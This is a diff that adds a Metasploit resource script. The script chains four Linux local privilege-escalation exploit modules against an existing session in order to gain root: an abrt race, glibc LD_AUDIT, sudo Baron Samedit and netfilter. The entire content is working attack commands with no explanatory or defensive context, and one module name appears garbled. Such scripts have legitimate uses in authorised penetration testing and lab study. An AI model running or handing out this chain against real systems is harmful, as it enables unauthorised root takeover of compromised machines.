@@ -1,0 +1,13 @@
+sessions -i SESSION
+use exploit/linux/local/abrt_raceabrt_root_priv_esc
+set SESSION SESSION
+exploit
+use exploit/linux/local/glibc_ld_audit_dso
+set SESSION SESSION
+exploit
+use exploit/linux/local/sudo_baron_samedit
+set SESSION SESSION
+exploit
+use exploit/linux/local/netfilter_priv_esc_ipv4
+set SESSION SESSION
+exploit
